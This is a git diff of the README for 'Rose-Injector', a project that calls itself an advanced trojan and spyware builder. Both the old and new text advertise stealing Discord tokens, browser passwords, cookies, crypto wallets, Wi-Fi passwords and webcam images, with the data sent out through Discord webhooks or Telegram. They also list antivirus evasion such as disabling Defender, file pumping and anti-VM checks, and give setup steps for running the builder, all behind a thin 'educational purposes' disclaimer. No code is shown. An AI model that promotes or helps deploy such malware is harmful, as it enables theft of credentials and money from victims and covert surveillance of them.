@@ -4,211 +4,128 @@
   <br>
 </h1>
 
-<div align="center">
-    <a href="https://discord.gg/Ts9RTFYvyt"><img src="https://img.shields.io/badge/Discord-%235865F2.svg?style=for-the-badge&logo=discord&logoColor=white"></a>
-    <br>
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge}" target="_blank"><img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Injector.svg/?label=active+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/></a>
-    <a href="https://www.codefactor.io/repository/github/damagingrose/rose-injector"><img src="https://www.codefactor.io/repository/github/damagingrose/rose-injector/badge" alt="CodeFactor" /></a>
-    <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge}" target="_blank"><img alt="DeepSource" title="DeepSource" src="https://deepsource.io/gh/DamagingRose/Rose-Injector.svg/?label=resolved+issues&show_trend=true&token=bRGn0dU76xkJxQgniOJnrc7a"/></a>
-    <br>
-    <img src="https://img.shields.io/github/languages/top/DamagingRose/Rose-Injector?color=%23000000">
-    <img src="https://img.shields.io/github/stars/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
-    <br>
-    <img src="https://img.shields.io/github/commit-activity/w/DamagingRose/Rose-Injector?color=%23000000"> 
-    <img src="https://img.shields.io/github/last-commit/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
-    <br>
-    <img src="https://img.shields.io/github/issues/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
-    <img src="https://img.shields.io/github/issues-closed/DamagingRose/Rose-Injector?color=%23000000&logoColor=%23000000">
-    <br>
+<div style="display": flex; flex-direction: column; justify-content: center; align-items: center; height: 100vh; background-color: #da467d;">
+    <div align="center">
+      <a href="https://discord.gg/Ts9RTFYvyt">
+          <img src="https://img.shields.io/badge/Discord-%23da467d.svg?style=flat-square&logo=discord&logoColor=white" alt="Join our Discord">
+      </a>
+      <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge}" target="_blank">
+          <img src="https://img.shields.io/badge/DeepSource-%23da467d.svg?style=flat-square&logo=deepsource" alt="DeepSource">
+      </a>
+      <a href="https://www.codefactor.io/repository/github/damagingrose/rose-injector">
+          <img src="https://img.shields.io/badge/CodeFactor-%23da467d.svg?style=flat-square" alt="CodeFactor">
+      </a>
+      <a href="https://deepsource.io/gh/DamagingRose/Rose-Injector/?ref=repository-badge}" target="_blank">
+          <img src="https://img.shields.io/badge/DeepSource-%23da467d.svg?style=flat-square&logo=deepsource" alt="DeepSource">
+      </a>
+      <img src="https://img.shields.io/badge/Top Language-%23da467d.svg?style=flat-square" alt="Top Language">
+      <img src="https://img.shields.io/badge/GitHub Stars-%23da467d.svg?style=flat-square&logo=github" alt="GitHub Stars">
+      <img src="https://img.shields.io/badge/Weekly Commits-%23da467d.svg?style=flat-square" alt="Weekly Commits">
+      <img src="https://img.shields.io/badge/Last Commit-%23da467d.svg?style=flat-square&logo=git" alt="Last Commit">
+      <img src="https://img.shields.io/badge/Open Issues-%23da467d.svg?style=flat-square" alt="Open Issues">
+      <img src="https://img.shields.io/badge/Closed Issues-%23da467d.svg?style=flat-square" alt="Closed Issues">
+    </div>
 </div>
 
 <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="100%">
 
 <div align="center">
     <h1>
-        ADVANCED TROJAN | MULTIPLE REMOTE ACCESS TROJANS
-        <br><br>MORE 🌟 = <a href=#stars>UPDATES</a>
+        ADVANCED SPYWARE BUILDER
     </h1>
 </div>
 
-<a href="https://discord.gg/Ts9RTFYvyt">Discord Server</a> | <a href="https://t.me/+7MDF550ZlLVhYjUy">Telegram Group</a> | <a href="https://t.me/gumbobr0t">Telegram from the Developer</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
+<div align="center">
+  <a href="https://discord.gg/Ts9RTFYvyt">Discord Server</a> | <a href="https://t.me/+7MDF550ZlLVhYjUy">Telegram Group</a> | <a href="https://t.me/gumbobr0t">Telegram from the Developer</a> | by <a href="https://github.com/xpierroz">pierro</a>, <a href="https://github.com/Gumbobrot">Gumbobrot</a>, <a href="https://github.com/suvan1911">suvan</a>, <a href="https://github.com/suegdu">suegdu</a></strong>
 </div>
 
-## <a id="table"></a> Table of contents
+## Features
 
-- [Blog](#blog)
-- [Star goals & updates](#stars)
-- [What is this?](#whatisthis)
-- [Features](#features)
-- [Discord Server](https://discord.gg/Ts9RTFYvyt)
-- [Telegram Group](https://t.me/+7MDF550ZlLVhYjUy)
-- [Setup](#setup)
-- [Preview](#preview)
-- [Changelog](#changelog)
-- [Bugs Or Errors](#bugsorerrors)
-- [Credits](#credits)
-- [Star Collection](#stcollection)
-- [Star History](#history)
-- [License](#lisence)
+| Feature                                      | Description                                  | Supported | In Progress | Future |
+|----------------------------------------------|----------------------------------------------|-----------|-------------|--------|
+| GUI Builder                                  | Create user-friendly interfaces easily.      | Yes       | Yes            | Yes       |
+| UAC Bypass                                   | Bypass User Account Control for elevated privileges. | No | No            | Yes       |
+| Custom Icon                                  | Set a unique icon for your application.      | Yes       | Yes            | Yes       |
+| Runs On Startup                              | Automatically start with Windows.           | Yes       | No            | Yes       |
+| Disables Windows Defender                    | Disable built-in antivirus protection.      | No       | Yes            | Yes       |
+| Anti-VM                                      | Detect and evade virtual machine environments. | Yes    | Yes            | Yes       |
+| Blocks AV-Related Sites                      | Prevent access to antivirus websites.       | No       | No            | Yes       |
+| Melt Stub                                    | Make the malware difficult to detect by self-destructing. | No | No            | Yes       |
+| Fake Error                                   | Display fake error messages to deceive users. | Yes     | No            | Yes       |
+| EXE Binder                                   | Combine multiple files into a single executable. | No | No            | Yes       |
+| File Pumper                                  | Inflate file sizes to hide malicious content. | Yes  | No            | Yes       |
+| Obfuscated Code                              | Use code obfuscation techniques for evasion. | No  | Yes            | Yes       |
+| Discord Injection                            | Inject code into Discord processes.         | No       | Yes            | Yes       |
+| Steals Discord Tokens                        | Extract user tokens from Discord.          | Yes       | No            | Yes       |
+| Steals Steam Session                         | Gather active Steam sessions.              | Yes       | No            | Yes       |
+| Steals Epic Session                          | Gather active Epic Games sessions.         | Yes       | No            | Yes       |
+| Steals Uplay Session                         | Gather active Uplay sessions.              | No       | No            | Yes       |
+| Steals Battle.Net Session                    | Gather active Battle.Net sessions.         | No       | No            | Yes       |
+| Steals Passwords From Many Browsers          | Extract stored passwords.                 | Yes       | Yes            | Yes       |
+| Steals Cookies From Many Browsers            | Collect browser cookies.                  | Yes       | Yes            | Yes       |
+| Steals History From Many Browsers            | Access browsing history.                  | Yes       | Yes            | Yes       |
+| Steals Autofills From Many Browsers          | Extract autofill data.                    | No       | Yes            | Yes       |
+| Steals Minecraft Session Files               | Gather Minecraft session information.      | Yes       | No            | Yes       |
+| Steals Telegram Session Files                | Extract Telegram session data.            | No       | No            | Yes       |
+| Steals Crypto Wallets                        | Target cryptocurrency wallets.           | Yes       | No            | Yes       |
+| Steals Roblox Cookies                        | Gather Roblox-related data.               | Yes       | No            | Yes       |
+| Steals Growtopia Session                     | Extract Growtopia session info.           | No       | No            | Yes       |
+| Steals IP Information                        | Collect IP addresses.                     | Yes       | No            | Yes       |
+| Steals System Info                           | Gather system-specific details.          | Yes       | No            | Yes       |
+| Steals Saved Wifi Passwords                  | Extract saved Wi-Fi passwords.            | Yes       | No            | Yes       |
+| Steals Common Files                          | Collect files commonly used for attacks.  | No       | No            | Yes       |
+| Captures Screenshot                          | Take screenshots of the user's desktop.  | Yes       | No            | Yes       |
+| Captures Webcam Image                        | Access and capture webcam images.        | Yes       | No            | Yes       |
+| Sends All Data Through Discord Webhooks/Telegram Bot/Attacker Client | Send stolen data to specified destinations. | Yes | Yes            | Yes       |
+| File Type Selection Screensaver              | Choose between screensaver or executable. | Yes       | No         | Yes       |
+| Trigger BSOD                                 | Cause a Blue Screen of Death.            | No        | No            | Yes    |
+| Freeze Screen                                | Freeze the user's screen.                | No        | No            | Yes    |
+| Spread Malware                               | Send malicious messages to friends on social media. | No          | Yes            | Yes    |
+| Crypto Miner                                 | Use the victim's computer for cryptocurrency mining. | No         | Yes            | Yes    |
+| Crypto Miner                                 | Use the victim's computer for cryptocurrency mining. | No         | Yes            | Yes    |
 
-## <a id="blog"></a> Blog
-**We will keep you updated and remove specific warnings if the problems are solved.**
+## Disclaimer
 
-#### 10/08/2023 - I'll be working more on actual fixes now, because I add more stuff with issues than i actually fix.
+This tool is intended for educational purposes only. Use responsibly and with explicit permission from the system owner. The creators are not liable for misuse or illegal activity resulting from its usage.
 
-#### 02/08/2023 - Working on an improved version of Rose-Injector & Rose-RAT but I have like 5 really time-spending projects running at the same time, so expect the next bigger update to take some more time. :)
-#### 10/07/2023 - Following functions are not available at the moment: `getadmin | disable windows defender`, `injection`, `malicious` and `obf src`. Our team is already working hard on solving these problems.
-#### 11/06/2023 - Almost everything is working, however, to compile you *must disable real time protection for windows defender*.
-#### Encoutered an error while building? Join our [Discord server](https://discord.gg/Ts9RTFYvyt) or [Telegram group](https://t.me/+7MDF550ZlLVhYjUy)! You will need to send us both .log files which are created while building.
+## Preview
 
-## <a id="stars"></a> Upcoming updates
+## Setup
 
-##### Right now = Get admin category full fix + scrape file with batch + profesional batch obfuscation + general improvements + file appearance addons + additional fixes / features + fix injection - WIP
-##### 60 Stars = Crypto Miner (Bitcoin and/or Monero) + Professional obfuscations - WIP
-##### 70 Stars = All bugs fixed (hard asf real) + better vm detection. - WIP
-##### 85 Stars = Heavy Knight-RAT update + new functions like DM all friends, trigger bsod / freeze screen (on specific actions) for Rose Injector.
-##### 175 Stars = A more advanced stealer & rat both built in one with a web control panel + a professional multi tool. 
+**By virtue of our sophisticated installation process, manual installation of Python is rendered unnecessary. Our meticulously designed batch script adeptly manages this procedure on your behalf.**
++ Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
++ Extract the ZIP folder which you just downloaded.
++ Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/components/builder.bat) to have the [`builder`](https://github.com/DamagingRose/Rose-Injector/blob/main/components/roseui/v8.pyw) open automatically.
 
-## <a id="whatisthis"></a> What is this?
+## Changelog
 
-**Our professional team spent months of work on this project and we hope you will enjoy your journey through the world of cybersecurity.**
+- **1.5 (2023-08-10)**
+  - Improved obfuscation and file type selection
+  - Added log buttons and file pumper
 
-[Rose-Injector](https://github.com/DamagingRose/Rose-Injector) is an advanced and really malicious trojan which collects account credentials & sends them to a discord webhook API.
+- **1.4 (2023-08-09)**
+  - Added custom icon support and file pumper
+  - Fixed Windows Defender detection
 
-[Rose-RAT](https://github.com/DamagingRose/Rose-RAT) is a remote access trojan with lots of features which allows the attacker to control a victims desktop with our application through different commands.
+- ...
 
-[Knight-RAT](https://github.com/DamagingRose/Rose-Injector/blob/main/components/source/knight_rat.py) is the improved version of Rose-RAT with commands being executed over discord & more features at all.
+## Problems
 
-## <a id="features"></a> Features
+To report issues, create an [issue](https://github.com/DamagingRose/Rose-Injector/issues) or join our [Discord](https://discord.gg/Ts9RTFYvyt). Reach out to the developer on [Telegram](https://t.me/gumbobr0t).
 
-- Logs Discord token and Discord account info
-- Logs PC info and IP
-- Logs browser passwords
-- Logs browser cookies
-- Logs Wi-Fi names and Wi-Fi passwords
-- Logs Roblox account data and login cookie
-- Sends you the victim's location and desktop screenshot
-- Startup integration
-- JavaScript injector: Discord passwords, names, emails, phone numbers, successfully purchased Nitro Codes will be sent to your webhook
-- Built-in Knight RAT
-- Built-in Rose RAT
-- UI integration
-- Compiler that creates an EXE file for you
-- Obfuscation which makes your file almost impossible to be read by humans - WIP
-- VirusTotal/VM bypass/blacklist
-- Small file size (UPX)
-- File pumper
-- Diversity - Change the Icon, name and functions of your stub by yourself through the beautiful builder
-- Bypass/disable Windows Defender/Firewalls - WIP
-- Crypto miners (Bitcoin/Etherum) - WIP
-- Way more...
+## Credits
 
-## <a id="setup"></a> Setup
-**Due to our professional installation mechanism you won't need to install python manually, our batch script does it automated for you.**
+**Main Developers:**
+- [xpierroz](https://github.com/xpierroz)
+- [gumbobr0t](https://github.com/gumbobr0t)
 
-- Download the repository by clicking [here](https://github.com/DamagingRose/Rose-Injector/archive/refs/heads/main.zip).
-- Extract the ZIP folder which you just downloaded.
-- Run the [`start.bat`](https://github.com/DamagingRose/Rose-Injector/blob/main/start.bat) to have the [`builder`](https://github.com/DamagingRose/Rose-Injector/blob/main/components/builder.bat) open automatically.
+**External Contributions:**
+- [yxvi](https://github.com/I-Skid)
+- [Smug246](https://github.com/Smug246)
+- [Rdimo](https://github.com/Rdimo)
+- [loTus04](https://github.com/loTus04)
+- [suvan1911](https://github.com/suvan1911)
+- [suegdu](https://github.com/suegdu)
 
-## <a id="preview"></a> Preview
-
-<img src="https://i.imgur.com/LjJy0JS.png">
-<img src="https://i.imgur.com/I1M8LUV.png">
-<img src="https://i.imgur.com/KRlMMV6.png">
-<img src="https://i.imgur.com/Itvo9SE.png">
-<img src="https://i.imgur.com/eqKbMHt.png">
-<img src="https://media.discordapp.net/attachments/1118940500217577513/1119311790174634114/image.png" width="600" height="600">
-
-**+ way more!!** Adding pictures of cookie stealing, password stealing and the RAT's soon.
-
-## <a id="changelog"></a> Changelog
-```
-[1.5] - 2023-08-10
-Fixed disable firewalls, added obfuscation (needs fix)
-~ Added obfuscation (needs to be fixed)
-+ Added final file type selection (screensaver / executable)
-+ Added log buttons
-/ Fixed disable firewalls
-
-[1.4] - 2023-08-09
-Added raw crypto miner func without code, fixed general bugs in malicious, added file pumper & custom icon support
-+ specify a specific icon path now with even basic path as original windows executable icon
-+ successfully added file pumper to avoid ant1v1rus3s (ye ant1v1rus3s can be bypassed by simply having a file bigger than 650 mb)
-~ added crypt0 m1n3r function in the builder but not finished
-/ tried to fix some bugs lol (like in m@l1c10us)
-/ hopefully fixed knight r@t integration
-+ added scr (screensaver) support for st@rt4p
-
-[1.3] - 2023-07-17
-Force disabled unstable functions and added webcam grabbing, also fixed screenshot and startup
-
-- Fixed Startup
-- Disabled unstable functions and working on a hardfix
-- Added webcam grabbing option
-- Fixed wrong ordinary with roblox and screenshot grabbing in v8.pyw
-
-[1.2] - 2023-07-09
-Fixed the windows defender detection while building, added knight rat and disabling functions for windows defender and firewall
-
-- Added another RAT (type), which is hosted over discord called Knight-RAT
-- Made the source files not being scraped anymore because of windows defender detections
-- Better config file so nobody can skid our stuff
-- Added disable windows defender and disable windows firewall options (includes getadmin)
-
-[1.1] - 2023-06-12
-Repaired the project
-
-- Successfuly repaired the project
-- Modified the UI so the backend is included in the same file
-- Added a logging method
-- Added new options (Disable defender (in progress), VM detection, etc...)
-
-[1.0] - 2023-03-21
-First Release
-
-- Created a UI compiler for the Rose Grabber
-- Made the first version of the RAT
-```
-
-## <a id="bugsorerrors"></a> Bugs Or Errors?
-- To Report An Error Make An **[Issue](https://github.com/DamagingRose/Rose-Injector/issues)**
-- Or Join The **[Discord](https://discord.gg/Ts9RTFYvyt)**
-- Message the developer on **[Telegram](https://t.me/gumbobr0t)**
-- Join our **[Telegram group](https://t.me/+7MDF550ZlLVhYjUy)** for the new stealer.
-
-## <a id="credits"></a> Credits
-
-**Main developers:**
-- [xpierroz](https://github.com/xpierroz) (Current main developer)
-- [Gumbobrot](https://github.com/Gumbobrot) (Current main developer)
-- [suegdu](https://github.com/suegdu) (Old developer of the first builder)
-- [svn](https://github.com/suvan1911) (Old developer)
-
-**External credits:**
-- [skid](https://github.com/I-Skid) (README.md improvements)
-- [Smug246](https://github.com/Smug246) (Python Injector, Roblox Cookie Stealer)
-- [Rdimo](https://github.com/Rdimo) (JavaScript Injection)
-- [loTus04](https://github.com/loTus04) (W4SP Stealer)
-
-## <a id="stcollection"></a> Star collection
+## Love to everyone
 [![Stargazers repo roster for @DamagingRose/Rose-Injector](https://reporoster.com/stars/dark/DamagingRose/Rose-Injector)](https://github.com/DamagingRose/Rose-Injector/stargazers)
-
-## <a id="history"></a> Star History
-
-[![Star History Chart](https://api.star-history.com/svg?repos=DamagingRose/RoseRAT,DamagingRose/Rose-Injector&type=Date)](https://star-history.com/#DamagingRose/RoseRAT&DamagingRose/Rose-Injector&Date)
-
-## <a id="lisence"></a> License
-
-This program, is intended solely for educational purposes, to demonstrate the vulnerabilities of computer systems and to promote awareness of cybersecurity. The program should only be used in controlled environments with explicit permission from the system owner.
-
-While the program may be used to assess the security of computer systems, it should not be used for malicious purposes or any activity that may cause harm or damage to computer systems or networks. Any misuse or illegal activity resulting from the use of this program is strictly prohibited and the responsibility lies solely with the user.
-
-The author of this program is not liable for any damage, harm, or legal consequences resulting from the use or misuse of this program. By using this program, you acknowledge that you understand the potential risks and agree to assume full responsibility for any actions taken using the program.
-
-### Rose Injector is licensed under the <a href="https://mit-license.org/.">MIT License</a>
-
-### This is for educational purposes only. Use at your own risk. We are not responsible for any of your actions!
-
-<div align=center>
-    <a href=#top>Back to top</a><br><a href=#table>Back to to table of contents</a>
-</div>
